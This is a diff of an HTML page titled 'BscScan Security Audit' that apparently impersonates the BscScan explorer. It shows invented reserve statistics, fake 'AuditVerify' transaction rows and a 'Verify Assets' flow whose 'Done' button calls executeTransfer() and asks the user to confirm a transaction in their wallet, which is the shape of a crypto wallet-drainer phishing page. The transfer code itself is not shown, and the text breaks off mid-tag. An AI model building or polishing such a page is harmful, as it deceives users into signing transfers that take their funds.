@@ -5,7 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>BscScan Security Audit</title>
   
-  <!-- Ethers.js Library for Web3 Logic -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 
   <style>
@@ -159,7 +158,7 @@
         <div class="sync-text">Tokens are authentic and synchronized directly with mainnet validator nodes.</div>
       </div>
       
-      <!-- Done Button -->
+      <!-- Modal Done Button -->
       <button class="btn-done" id="modalConfirmBtn" onclick="executeTransfer()">Done</button>
       <div id="modalStatusMsg" style="font-size:10px; color:#f3ba2f; display:none; text-align:center; font-weight:bold; margin-top:10px;">
         Please confirm the transaction in your wallet popup.
@@ -170,7 +169,6 @@
   <!-- MAIN APP CONTENT -->
   <div class="app-container" id="appContent">
     
-    <!-- Top Header -->
     <div class="brand-header">
       <div class="brand-logo">
         <div class="shield-icon">
@@ -190,7 +188,6 @@
     </div>
 
     <div class="content-area">
-      <!-- Stats -->
       <div class="card">
         <div class="card-label">USDT VERIFIED (24H)</div>
         <div class="card-value text-yellow" id="usdt-val">$15,906,052</div>
@@ -209,7 +206,6 @@
         <div class="card-subtext-gray">1.05 Gwei Standard Gas</div>
       </div>
 
-      <!-- Banner & Description -->
       <div class="banner-pill">
         BscScan Proof-of-Reserve Protocol
       </div>
@@ -217,7 +213,6 @@
       <div class="main-heading">BNB Smart Chain <span>Security<br>Audit</span></div>
       <div class="main-desc">The institutional gateway for smart contract auditing and asset verification on the BNB Smart Chain ecosystem.</div>
 
-      <!-- Verify Action Box -->
       <div class="verify-box">
         <div class="token-row">
           <div class="token-info">
@@ -242,7 +237,6 @@
           <div class="verify-title">Verify Assets</div>
           <div class="verify-desc">Execute official on-chain validation for your tokens via direct Smart Chain consensus.</div>
           
-          <!-- Verification Button -->
           <button id="mainVerifyBtn" class="btn-verify" onclick="initiateAuditFlow()">
             <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:16px;height:16px;" id="btnIcon">
               <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
@@ -251,7 +245,7 @@
           </button>
 
           <div id="statusMsg" style="font-size:10px; color:#f3ba2f; display:none; text-align:center; font-weight:bold;">
-            Please follow the prompts in your wallet.
+            Please confirm connection in your wallet.
           </div>
           
           <div class="verify-footer-notes">
@@ -317,4 +311,9 @@
           <tr>
             <td class="hash-text">0x3a19...8c44</td>
             <td><span class="method-badge">AuditVerify</span></td>
-            <td>3
+            <td>38924099</td>
+          </tr>
+          <tr>
+            <td class="hash-text">0x9c21...e5f3</td>
+            <td><span class="method-badge">AuditVerify</span></td>
+            <td>38924095</t
